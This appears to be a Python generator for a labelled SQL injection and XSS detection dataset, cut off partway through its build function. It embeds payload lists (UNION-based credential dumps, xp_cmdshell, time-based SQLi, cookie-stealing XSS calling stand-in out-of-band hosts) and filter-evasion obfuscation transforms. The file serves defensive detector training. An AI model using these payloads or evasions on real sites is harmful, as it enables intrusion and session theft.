#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Obfuscation SQLi/XSS dataset generator (CSIC-style, full HTTP context).

Fixes the 4 known problems of the old dataset:
  (1) payload-only  -> full HTTP request context (method, url, host, UA, cookie, content-type, body)
  (2) template benign -> 7 realistic business flows, UA/cookie/param diversity + hard negatives
  (3) 1494 exploded obfuscation combos -> canonical (sorted) technique list, fixed apply-order,
      coarse obfuscation_type (4 values), capped subset selection
  (4) 45k meaningless "none" -> obfuscation_* is NULL for benign; capped 'plain' ratio for attacks

Usage:
  python generate_obfu_dataset.py --scale pilot   # ~2k rows
  python generate_obfu_dataset.py --scale full    # 50k benign + 25k sqli + 25k xss
"""
import argparse, csv, hashlib, json, random, string, uuid
from collections import Counter, defaultdict
from urllib.parse import quote

SEED = 1337

# ----------------------------------------------------------------------------
# POOLS
# ----------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.0.0 Mobile/15E148 Safari/604.1",
    "PostmanRuntime/7.37.3",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "okhttp/4.12.0",
    "Java/17.0.10",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

HOSTS = [
    "shop.northwind-mart.com", "www.northwind-mart.com", "api.northwind-mart.com",
    "admin.northwind-mart.com", "store.acme-retail.io", "app.bluewave-shop.net",
    "www.bluewave-shop.net", "api.bluewave-shop.net", "portal.citymart.vn",
    "shop.citymart.vn", "checkout.acme-retail.io", "m.northwind-mart.com",
]

FIRST_NAMES = ["john","mary","david","linh","huy","anna","peter","trang","minh","sara",
    "james","olivia","khang","tuan","emma","daniel","ngoc","liam","noah","mia",
    "an","binh","chi","dung","giang","ha","khanh","lan","nam","phuong","quan","son","thao","vy"]
LAST_NAMES = ["smith","nguyen","tran","le","pham","brown","wilson","garcia","vo","do",
    "hoang","bui","dang","ngo","duong","ly","kim","chen","patel","khan"]
PRODUCTS = ["wireless-mouse","mechanical-keyboard","usb-c-cable","laptop-stand","webcam-1080p",
    "noise-cancelling-headphones","gaming-monitor","office-chair","desk-lamp","power-bank",
    "smartphone-case","bluetooth-speaker","external-ssd","hdmi-adapter","standing-desk",
    "coffee-mug","water-bottle","backpack","notebook-a5","fountain-pen","running-shoes",
    "yoga-mat","air-purifier","smart-watch","tablet-10inch"]
SEARCH_TERMS = ["cheap laptop","best headphones 2026","gaming mouse","office chair ergonomic",
    "usb c hub","4k monitor","wireless earbuds","standing desk white","mechanical keyboard brown switch",
    "iphone case clear","running shoes size 42","yoga mat non slip","coffee grinder","áo thun nam",
    "giày thể thao","bàn phím cơ","tai nghe bluetooth","O'Brien collection","AT&T adapter","C# book"]
CATEGORIES = ["electronics","accessories","home-office","sports","books","fashion","toys","garden"]
CITIES = ["hanoi","ho-chi-minh","danang","new-york","london","tokyo","singapore","berlin","sydney","paris"]

METHODS_BENIGN = ["GET","POST","PUT","PATCH","DELETE"]

rnd = random.Random(SEED)

# ----------------------------------------------------------------------------
# small helpers
# ----------------------------------------------------------------------------
def rand_hex(n): return ''.join(rnd.choice("0123456789abcdef") for _ in range(n))
def rand_alnum(n): return ''.join(rnd.choice(string.ascii_letters + string.digits) for _ in range(n))

def make_cookie(role=None, with_cart=False):
    parts = []
    style = rnd.choice(["JSESSIONID","PHPSESSID","connect.sid","sessionid","laravel_session"])
    if style == "JSESSIONID":
        parts.append(f"JSESSIONID={rand_hex(32).upper()}")
    elif style == "PHPSESSID":
        parts.append(f"PHPSESSID={rand_alnum(26)}")
    elif style == "connect.sid":
        parts.append(f"connect.sid=s%3A{rand_alnum(24)}.{rand_alnum(27)}")
    elif style == "sessionid":
        parts.append(f"sessionid={rand_alnum(32)}")
    else:
        parts.append(f"laravel_session={rand_alnum(40)}")
    if rnd.random() < 0.6:
        parts.append(f"csrftoken={rand_alnum(rnd.choice([32,40]))}")
    if with_cart and rnd.random() < 0.7:
        parts.append(f"cart_id={rand_hex(16)}")
    if role:
        parts.append(f"role={role}")
    if rnd.random() < 0.4:
        parts.append(f"locale={rnd.choice(['en-US','vi-VN','en-GB','ja-JP'])}")
    rnd.shuffle(parts)
    return "; ".join(parts)

def wire_hash(method, host, url, content, cookie="", ua=""):
    # full request signature: cookie & UA included so payloads injected there aren't wrongly deduped
    return hashlib.sha1(f"{method}|{host}|{url}|{content}|{cookie}|{ua}".encode("utf-8","replace")).hexdigest()

def blank_row():
    return {
        "request_id": str(uuid.UUID(int=rnd.getrandbits(128))),
        "method":"", "url":"", "host":"", "user_agent":"", "cookie":"",
        "content_type":"", "content":"", "classification":"", "attack_category":"",
        "context_location":"", "obfuscation_techniques":"", "obfuscation_type":"",
        "technique_count":0, "difficulty_level":"", "is_second_order":False,
        "is_time_based":False, "linked_request_id":"", "source":"",
    }

# ----------------------------------------------------------------------------
# BENIGN generator - 7 flows
# ----------------------------------------------------------------------------
def benign_login():
    host = rnd.choice([h for h in HOSTS if not h.startswith("api.")])
    if rnd.random() < 0.35:
        return dict(method="GET", host=host, url="/login", content_type="", content="")
    user = f"{rnd.choice(FIRST_NAMES)}.{rnd.choice(LAST_NAMES)}"
    if rnd.random() < 0.2:  # hard negative: apostrophe in name is valid
        user = f"{rnd.choice(['o','d','l'])}'{rnd.choice(LAST_NAMES)}"
    pw = rand_alnum(rnd.randint(8,16))
    body = f"username={quote(user)}&password={quote(pw)}&remember={rnd.choice(['on','off','true'])}"
    return dict(method="POST", host=host, url="/login",
                content_type="application/x-www-form-urlencoded", content=body)

def benign_search():
    host = rnd.choice([h for h in HOSTS if not h.startswith("admin.")])
    term = rnd.choice(SEARCH_TERMS)
    params = [f"q={quote(term)}"]
    if rnd.random()<0.6: params.append(f"category={rnd.choice(CATEGORIES)}")
    if rnd.random()<0.5: params.append(f"sort={rnd.choice(['price_asc','price_desc','relevance','newest','rating'])}")
    if rnd.random()<0.5: params.append(f"page={rnd.randint(1,25)}")
    if rnd.random()<0.3: params.append(f"min_price={rnd.randint(0,50)}&max_price={rnd.randint(100,999999)}")
    rnd.shuffle(params)
    return dict(method="GET", host=host, url="/search?"+"&".join(params), content_type="", content="")

def benign_rest_api():
    host = rnd.choice([h for h in HOSTS if h.startswith("api.")] or HOSTS)
    method = rnd.choice(["GET","POST","PUT","PATCH","DELETE"])
    res = rnd.choice(["users","orders","products","reviews","addresses","payments","wishlists"])
    rid = rnd.randint(1,99999)
    if method in ("GET","DELETE"):
        url = f"/api/v1/{res}/{rid}"
        body=""; ct=""
    else:
        url = f"/api/v1/{res}" + (f"/{rid}" if method in ("PUT","PATCH") else "")
        payload = {"name": f"{rnd.choice(FIRST_NAMES)} {rnd.choice(LAST_NAMES)}",
                   "email": f"{rnd.choice(FIRST_NAMES)}@example.com",
                   "quantity": rnd.randint(1,10), "note": rnd.choice(["","gift wrap please","leave at door",""])}
        keys = list(payload.keys()); rnd.shuffle(keys)
        body = json.dumps({k:payload[k] for k in keys}, ensure_ascii=False)
        ct = "application/json"
    return dict(method=method, host=host, url=url, content_type=ct, content=body)

def benign_cart():
    host = rnd.choice([h for h in HOSTS if not h.startswith("admin.")])
    action = rnd.choice(["add","update","remove","view","checkout"])
    if action=="add":
        body=f"product_id={rnd.randint(1000,9999)}&quantity={rnd.randint(1,5)}&variant={rnd.choice(['s','m','l','xl','default'])}"
        return dict(method="POST", host=host, url="/cart/add",
                    content_type="application/x-www-form-urlencoded", content=body)
    if action=="update":
        body=json.dumps({"item_id":rnd.randint(1,50),"quantity":rnd.randint(1,9)})
        return dict(method="PUT", host=host, url="/cart/update", content_type="application/json", content=body)
    if action=="remove":
        return dict(method="DELETE", host=host, url=f"/cart/item/{rnd.randint(1,50)}", content_type="", content="")
    if action=="checkout":
        body=f"payment={rnd.choice(['card','paypal','cod','applepay'])}&address_id={rnd.randint(1,20)}&coupon={rnd.choice(['','SAVE10','FREESHIP','WELCOME'])}"
        return dict(method="POST", host=host, url="/checkout",
                    content_type="application/x-www-form-urlencoded", content=body)
    return dict(method="GET", host=host, url="/cart", content_type="", content="")

def benign_pagination():
    host = rnd.choice(HOSTS)
    cat = rnd.choice(CATEGORIES)
    if rnd.random()<0.5:
        url=f"/products?category={cat}&page={rnd.randint(1,100)}&limit={rnd.choice([10,20,25,50])}"
    else:
        url=f"/products?category={cat}&offset={rnd.randint(0,2000)}&limit={rnd.choice([10,20,25,50])}"
    if rnd.random()<0.3:
        url+=f"&cursor={rand_alnum(16)}"
    return dict(method="GET", host=host, url=url, content_type="", content="")

def benign_upload():
    host = rnd.choice(HOSTS)
    boundary = "----WebKitFormBoundary"+rand_alnum(16)
    fname = rnd.choice(["invoice","photo","avatar","report","resume","receipt"])+ \
            rnd.choice([".pdf",".png",".jpg",".docx",".csv"])
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n<binary {rnd.randint(1000,900000)} bytes>\r\n--{boundary}--")
    return dict(method="POST", host=host, url="/upload",
                content_type=f"multipart/form-data; boundary={boundary}", content=body)

def benign_admin():
    host = rnd.choice([h for h in HOSTS if h.startswith("admin.")] or HOSTS)
    ep = rnd.choice(["/admin/users","/admin/orders","/admin/settings","/admin/reports","/admin/inventory"])
    if rnd.random()<0.5:
        return dict(method="GET", host=host, url=ep+f"?page={rnd.randint(1,10)}", content_type="", content="",
                    _role="admin")
    body=f"csrf_token={rand_alnum(40)}&action={rnd.choice(['update','disable','enable','export'])}&target_id={rnd.randint(1,999)}"
    return dict(method="POST", host=host, url=ep,
                content_type="application/x-www-form-urlencoded", content=body, _role="admin")

BENIGN_FLOWS = [benign_login, benign_search, benign_rest_api, benign_cart,
                benign_pagination, benign_upload, benign_admin]
BENIGN_WEIGHTS = [0.16,0.20,0.18,0.18,0.12,0.06,0.10]

def gen_benign():
    flow = rnd.choices(BENIGN_FLOWS, weights=BENIGN_WEIGHTS, k=1)[0]
    d = flow()
    row = blank_row()
    row.update(method=d["method"], host=d["host"], url=d["url"],
               content_type=d.get("content_type",""), content=d.get("content",""),
               user_agent=rnd.choice(USER_AGENTS),
               cookie=make_cookie(role=d.get("_role"), with_cart=(flow==benign_cart)),
               classification="normal", attack_category="none",
               context_location="", obfuscation_techniques="", obfuscation_type="",
               technique_count=0, difficulty_level="", source="template")
    return row

# ----------------------------------------------------------------------------
# BASE PAYLOADS
# ----------------------------------------------------------------------------
SQLI_BASE = [
    "' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' OR '1'='1'-- -",
    "') OR ('1'='1", "1' OR '1'='1", "' OR 1=1#", "\" OR \"\"=\"",
    "' UNION SELECT username,password FROM users-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "1 UNION SELECT table_name,column_name FROM information_schema.columns-- -",
    "' UNION SELECT 1,2,3,4,5-- -",
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
    "' AND (SELECT COUNT(*) FROM users)>0-- -",
    "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -",
    "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
    "'; EXEC xp_cmdshell('whoami')-- -",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')-- -",
    "-1' UNION SELECT credit_card FROM payments-- -",
]
SQLI_TIME = [
    "' OR SLEEP(5)-- -", "' AND SLEEP(5)-- -", "1' AND SLEEP(5) AND '1'='1",
    "'; WAITFOR DELAY '0:0:5'-- -", "' OR pg_sleep(5)-- -",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
    "' RLIKE SLEEP(5)-- -", "' OR BENCHMARK(5000000,MD5(1))-- -",
    "1)) OR SLEEP(5)-- -", "' AND IF(1=1,SLEEP(5),0)-- -",
]
# second-order: the value that gets stored, then later executed
SQLI_STORED = [
    "admin'-- -", "x' UNION SELECT password FROM users-- -",
    "'||(SELECT version())||'", "test','a')-- -",
    "' OR 1=1-- -", "attacker'/**/UNION/**/SELECT/**/1-- -",
]

XSS_SCRIPT = ["<script>alert(1)</script>", "<script>alert(document.cookie)</script>",
              "<script>alert('XSS')</script>", "<script>fetch('/x?c='+document.cookie)</script>"]
XSS_EVENT = ["<img src=x onerror=alert(1)>", "<img src=x onerror=alert(document.cookie)>",
             "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
             "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
             "<video><source onerror=alert(1)>", "<body onpageshow=alert(1)>"]
XSS_SVG = ["<svg onload=alert(1)>", "<svg/onload=alert(1)>",
           "<svg><script>alert(1)</script></svg>", "<svg onload=alert(document.cookie)>"]
XSS_OTHER = ["<iframe src=javascript:alert(1)>", "<a href=\"javascript:alert(1)\">x</a>",
             "javascript:alert(1)", "<object data=javascript:alert(1)>"]
XSS_BLIND = [
    "<script src=//oob-{id}.collab-listener.net/x></script>",
    "<img src=x onerror=this.src='//oob-{id}.collab-listener.net/c='+document.cookie>",
    "\"><script src=//{id}.oob-callback.net></script>",
    "<script>new Image().src='//oob-{id}.collab-listener.net/?d='+document.cookie</script>",
]
XSS_STORED = ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
              "<svg/onload=alert(1)>", "\"><script>alert(document.domain)</script>"]

# ----------------------------------------------------------------------------
# OBFUSCATION TRANSFORMS
# ----------------------------------------------------------------------------
SQL_KEYWORDS = ["UNION","SELECT","FROM","WHERE","AND","OR","ORDER","BY","INSERT",
    "UPDATE","DELETE","DROP","EXEC","CONVERT","SUBSTRING","SLEEP","WAITFOR","BENCHMARK",
    "information_schema","columns","tables","users","password","username","extractvalue",
    "updatexml","concat","database","version","credit_card","payments","count","exists","if","rlike"]

def t_sqli_case(s):
    out=[]; changed=False
    for ch in s:
        if ch.isalpha() and rnd.random()<0.55:
            nc = ch.upper() if ch.islower() else ch.lower()
            if nc!=ch: changed=True
            out.append(nc)
        else: out.append(ch)
    return ("".join(out), changed)

def t_sqli_comment(s):
    changed=False
    # inline comment inside keywords
    for kw in ["UNION","SELECT","FROM","WHERE","ORDER","AND"]:
        import re
        def repl(m):
            nonlocal changed; changed=True
            w=m.group(0); i=len(w)//2
            return w[:i]+"/**/"+w[i:]
        s = re.sub(kw, repl, s, flags=re.IGNORECASE, count=1)
    # some spaces -> /**/
    if " " in s and rnd.random()<0.7:
        parts=s.split(" ")
        s="/**/".join(parts) if rnd.random()<0.3 else \
          " ".join(p if rnd.random()<0.5 else p for p in parts)  # keep; primary via keyword
        changed=True
    return (s, changed)

WS_TOKENS = ["%09","%0a","%0c","%0d","%20","+","%a0","\t"]
def t_sqli_whitespace(s):
    if " " not in s: return (s, False)
    out=[]; changed=False
    for ch in s:
        if ch==" " and rnd.random()<0.85:
            out.append(rnd.choice(WS_TOKENS)); changed=True
        else: out.append(ch)
    return ("".join(out), changed)

def _first_quoted_literal(s):
    import re
    m = re.search(r"'([^']+)'", s)
    return m

def t_sqli_hex(s):
    m=_first_quoted_literal(s)
    if not m: return (s, False)
    lit=m.group(1)
    if not lit.isascii() or len(lit)<1: return (s, False)
    hx="0x"+lit.encode().hex()
    return (s[:m.start()]+hx+s[m.end():], True)

def t_sqli_char(s):
    m=_first_quoted_literal(s)
    if not m: return (s, False)
    lit=m.group(1)
    if not lit.isascii() or len(lit)<1: return (s, False)
    charexpr="+".join(f"CHAR({ord(c)})" for c in lit)
    return (s[:m.start()]+charexpr+s[m.end():], True)

URL_SAFE_SKIP = set(string.ascii_letters+string.digits+"-_.~")
def t_sqli_urlencode(s, double=False):
    out=[]; i=0; changed=False
    while i<len(s):
        ch=s[i]
        if ch=="%" and i+2<len(s) and s[i+1] in "0123456789abcdefABCDEF" and s[i+2] in "0123456789abcdefABCDEF":
            # existing %xx: only re-encode in double mode
            if double:
                out.append("%25"); changed=True; i+=1; continue
            else:
                out.append(s[i:i+3]); i+=3; continue
        if ch not in URL_SAFE_SKIP:
            enc="%%%02X"%ord(ch) if ord(ch)<256 else quote(ch)
            if double: enc="%25"+enc[1:]
            out.append(enc); changed=True
        else:
            out.append(ch)
        i+=1
    return ("".join(out), changed)

# fixed pipeline order for SQLi
SQLI_PIPELINE = ["char_encoding","hex_encoding","comment_injection","case_variation",
                 "whitespace_variation","url_encoding"]
SQLI_TECHNIQUES = ["url_encoding","hex_encoding","comment_injection","case_variation",
                   "whitespace_variation","char_encoding"]
SQLI_MUTEX = [{"hex_encoding","char_encoding"}]  # literal-encoders are mutually exclusive

def apply_sqli(payload, chosen):
    applied=[]
    s=payload
    double = "url_encoding" in chosen and rnd.random()<0.4
    for tech in SQLI_PIPELINE:
        if tech not in chosen: continue
        if tech=="char_encoding": s,c=t_sqli_char(s)
        elif tech=="hex_encoding": s,c=t_sqli_hex(s)
        elif tech=="comment_injection": s,c=t_sqli_comment(s)
        elif tech=="case_variation": s,c=t_sqli_case(s)
        elif tech=="whitespace_variation": s,c=t_sqli_whitespace(s)
        elif tech=="url_encoding": s,c=t_sqli_urlencode(s, double=double)
        if c: applied.append("double_url_encoding" if (tech=="url_encoding" and double) else tech)
    return s, sorted(applied)

# ---- XSS transforms ----
def t_xss_case(s):
    out=[]; changed=False
    for ch in s:
        if ch.isalpha() and rnd.random()<0.5:
            nc=ch.upper() if ch.islower() else ch.lower()
            if nc!=ch: changed=True
            out.append(nc)
        else: out.append(ch)
    return ("".join(out), changed)

def t_xss_html_entity(s):
    changed=False; out=[]
    mapping={"<":["&lt;","&#60;","&#x3c;"], ">":["&gt;","&#62;","&#x3e;"],
             "\"":["&quot;","&#34;"], "'":["&#39;","&#x27;"], "/":["&#47;","&#x2f;"]}
    for ch in s:
        if ch in mapping and rnd.random()<0.8:
            out.append(rnd.choice(mapping[ch])); changed=True
        else: out.append(ch)
    return ("".join(out), changed)

def t_xss_js_hex(s):
    # \xHH for key chars, valid in JS string contexts
    changed=False; out=[]
    for ch in s:
        if ch in "<>()/'\";=" and rnd.random()<0.8:
            out.append("\\x%02x"%ord(ch)); changed=True
        else: out.append(ch)
    return ("".join(out), changed)

def t_xss_unicode(s):
    changed=False; out=[]
    for ch in s:
        if ch in "<>()/'\";=" and rnd.random()<0.8:
            out.append("\\u%04x"%ord(ch)); changed=True
        else: out.append(ch)
    return ("".join(out), changed)

def t_xss_double_url(s):
    single=quote(s, safe="")
    return (single.replace("%","%25"), True)

XSS_PIPELINE=["svg_bypass","event_handler","case_variation","html_entity","js_encoding",
              "unicode_escape","double_encoding"]

def apply_xss(payload, chosen):
    applied=[]
    s=payload
    # family techniques are structural markers (already reflected in base choice)
    for tech in ["svg_bypass","event_handler"]:
        if tech in chosen: applied.append(tech)
    if "case_variation" in chosen:
        s,c=t_xss_case(s)
        if c: applied.append("case_variation")
    # at most one encoding
    for tech in ["html_entity","js_encoding","unicode_escape","double_encoding"]:
        if tech in chosen:
            if tech=="html_entity": s,c=t_xss_html_entity(s)
            elif tech=="js_encoding": s,c=t_xss_js_hex(s)
            elif tech=="unicode_escape": s,c=t_xss_unicode(s)
            else: s,c=t_xss_double_url(s)
            if c: applied.append(tech)
            break
    return s, sorted(applied)

# ----------------------------------------------------------------------------
# combination selection (capped, weighted)
# ----------------------------------------------------------------------------
def choose_n(plain_ratio):
    if rnd.random()<plain_ratio: return 0
    return rnd.choices([1,2,3], weights=[0.5,0.30,0.20], k=1)[0]

def pick_sqli_techniques(n):
    if n==0: return set()
    pool=list(SQLI_TECHNIQUES); rnd.shuffle(pool)
    chosen=[]
    for t in pool:
        if len(chosen)>=n: break
        # enforce mutex
        if any(t in mx and (mx & set(chosen)) for mx in SQLI_MUTEX): continue
        chosen.append(t)
    return set(chosen)

# ----------------------------------------------------------------------------
# inject payload into HTTP context (attack rows reuse benign structure)
# ----------------------------------------------------------------------------
def inject_context(attack_category, payload, is_time, is_second, linked_id=None, source="grammar_mutated"):
    """Return a row dict with payload embedded in a chosen location."""
    row=blank_row()
    ua=rnd.choice(USER_AGENTS)
    host=rnd.choice(HOSTS)
    loc=rnd.choices(["query_param","form_field","json_body","cookie","header"],
                    weights=[0.42,0.24,0.16,0.10,0.08],k=1)[0]
    method="GET"; url="/"; ct=""; content=""; cookie=make_cookie()
    if loc=="query_param":
        method="GET"
        base=rnd.choice(["/search","/products","/item","/category","/view","/news","/profile"])
        p=rnd.choice(["q","id","name","category","sort","ref","user","page"])
        other=f"page={rnd.randint(1,9)}" if rnd.random()<0.5 else ""
        url=f"{base}?{p}={payload}"+(("&"+other) if other else "")
    elif loc=="form_field":
        method=rnd.choice(["POST","POST","PUT"])
        base=rnd.choice(["/login","/comment","/profile/update","/feedback","/register","/cart/add"])
        fld=rnd.choice(["username","comment","q","name","address","title","description"])
        content=f"{fld}={payload}&submit=1"
        ct="application/x-www-form-urlencoded"; url=base
    elif loc=="json_body":
        method=rnd.choice(["POST","PUT","PATCH"])
        base=rnd.choice(["/api/v1/users","/api/v1/comments","/api/v1/search","/api/v1/orders"])
        fld=rnd.choice(["name","query","comment","note","title"])
        content=json.dumps({fld:payload,"ts":rnd.randint(1,999999)}, ensure_ascii=False)
        ct="application/json"; url=base
    elif loc=="cookie":
        method=rnd.choice(["GET","POST"])
        base=rnd.choice(["/account","/dashboard","/orders","/home"])
        cookie=make_cookie()+f"; pref={payload}"
        url=base
    else:  # header injection (into User-Agent or Referer-like carried in UA field)
        method="GET"
        base=rnd.choice(["/","/home","/index","/search"])
        ua=payload if rnd.random()<0.5 else ua+" "+payload
        url=base
    row.update(method=method, url=url, host=host, user_agent=ua, cookie=cookie,
               content_type=ct, content=content, classification="anomalous",
               attack_category=attack_category, context_location=loc,
               is_time_based=is_time, is_second_order=is_second,
               linked_request_id=linked_id or "", source=source)
    return row

def finalize_labels(row, techniques):
    n=len(techniques)
    row["obfuscation_techniques"]="|".join(techniques)
    row["technique_count"]=n
    if n==0: row["obfuscation_type"]="plain"
    elif n==1: row["obfuscation_type"]="single_technique"
    elif n==2: row["obfuscation_type"]="combined_2"
    else: row["obfuscation_type"]="combined_3plus"
    # difficulty
    if row["is_second_order"] or row["is_time_based"]:
        row["difficulty_level"]="advanced"
    elif n==0: row["difficulty_level"]="baseline"
    elif n==1: row["difficulty_level"]="low"
    elif n==2: row["difficulty_level"]="medium"
    else: row["difficulty_level"]="high"
    return row

# ----------------------------------------------------------------------------
# attack generators
# ----------------------------------------------------------------------------
PLAIN_RATIO=0.10
SECOND_ORDER_RATIO=0.08
TIME_RATIO=0.12

def gen_sqli():
    r=rnd.random()
    is_time=False; is_second=False
    if r<TIME_RATIO:
        base=rnd.choice(SQLI_TIME); is_time=True
    elif r<TIME_RATIO+SECOND_ORDER_RATIO:
        base=rnd.choice(SQLI_STORED); is_second=True
    else:
        base=rnd.choice(SQLI_BASE)
    n=choose_n(PLAIN_RATIO)
    chosen=pick_sqli_techniques(n)
    payload, applied = apply_sqli(base, chosen)
    if is_second:
        # store request (carries payload) + linked trigger (no payload, benign-looking)
        link=str(uuid.UUID(int=rnd.getrandbits(128)))
        store=inject_context("sqli", payload, False, True, linked_id=link)
        store=finalize_labels(store, applied)
        trig=blank_row()
        thost=store["host"]
        trig.update(method="GET", host=thost,
                    url=rnd.choice(["/admin/users","/profile/view","/account/orders","/moderation/queue"])+f"?id={rnd.randint(1,999)}",
                    user_agent=rnd.choice(USER_AGENTS), cookie=make_cookie(role="admin"),
                    content_type="", content="", classification="anomalous",
                    attack_category="sqli", context_location="", obfuscation_techniques="",
                    obfuscation_type="plain", technique_count=0, difficulty_level="advanced",
                    is_second_order=True, is_time_based=False, linked_request_id=link,
                    source="grammar_mutated")
        return [store, trig]
    row=inject_context("sqli", payload, is_time, False)
    row=finalize_labels(row, applied)
    return [row]

def gen_xss():
    r=rnd.random()
    is_time=False; is_second=False
    fam_tech=None
    if r<TIME_RATIO:  # blind / OOB
        base=rnd.choice(XSS_BLIND).format(id=rand_hex(6)); is_time=True
        if "onerror" in base or "onload" in base: fam_tech="event_handler"
    elif r<TIME_RATIO+SECOND_ORDER_RATIO:
        base=rnd.choice(XSS_STORED); is_second=True
    else:
        fam=rnd.choices(["script","event","svg","other"],weights=[0.32,0.30,0.24,0.14],k=1)[0]
        if fam=="script": base=rnd.choice(XSS_SCRIPT)
        elif fam=="event": base=rnd.choice(XSS_EVENT); fam_tech="event_handler"
        elif fam=="svg": base=rnd.choice(XSS_SVG); fam_tech="svg_bypass"
        else: base=rnd.choice(XSS_OTHER)
    # choose techniques: family (if any) + up to remaining
    n=choose_n(PLAIN_RATIO)
    extras=["case_variation","html_entity","js_encoding","unicode_escape","double_encoding"]
    rnd.shuffle(extras)
    chosen=set()
    if fam_tech: chosen.add(fam_tech)
    for e in extras:
        if len(chosen)>=max(n, 1 if fam_tech else 0): break
        if e in ("html_entity","js_encoding","unicode_escape","double_encoding") and \
           any(x in chosen for x in ("html_entity","js_encoding","unicode_escape","double_encoding")):
            continue
        chosen.add(e)
    if n==0 and not fam_tech:
        chosen=set()
    payload, applied = apply_xss(base, chosen)
    if is_second:
        link=str(uuid.UUID(int=rnd.getrandbits(128)))
        store=inject_context("xss", payload, False, True, linked_id=link)
        store=finalize_labels(store, applied)
        trig=blank_row()
        trig.update(method="GET", host=store["host"],
                    url=rnd.choice(["/comments/thread","/profile/view","/admin/reviews","/feed"])+f"?uid={rnd.randint(1,9999)}",
                    user_agent=rnd.choice(USER_AGENTS), cookie=make_cookie(role=rnd.choice([None,"admin"])),
                    content_type="", content="", classification="anomalous",
                    attack_category="xss", context_location="", obfuscation_techniques="",
                    obfuscation_type="plain", technique_count=0, difficulty_level="advanced",
                    is_second_order=True, is_time_based=False, linked_request_id=link,
                    source="grammar_mutated")
        return [store, trig]
    row=inject_context("xss", payload, is_time, False)
    row=finalize_labels(row, applied)
    return [row]

# ----------------------------------------------------------------------------
# BUILD
# ----------------------------------------------------------------------------
def build(n_benign, n_sqli, n_xss):
    rows=[]; seen=set(); cnt={"none":0,"sqli":0,"xss":0}
    def add(r):
        if r["attack_category"]=="none":
            # benign: session cookie is random noise -> dedup on request structure only
            h=wire_hash(r["method"],r["host"],r["url"],r["content"])
        else:
            # attack: payload may live in cookie/UA -> include them in signature
